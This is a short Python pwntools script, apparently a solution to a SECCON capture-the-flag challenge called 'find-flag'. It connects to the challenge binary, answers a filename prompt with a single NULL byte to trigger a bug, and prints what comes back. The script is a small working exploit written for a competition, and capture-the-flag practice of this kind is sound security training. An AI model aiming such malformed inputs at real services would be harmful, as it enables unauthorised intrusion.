from pwn import *

HOST='find-flag.seccon.games'
PORT=10042
target = './target'

# conn = remote(HOST, PORT)
conn = process(target)

conn.recvuntil("filename: ")
# send NULL byte
conn.sendline(b'\x00')
res = conn.recvall()
print(res)

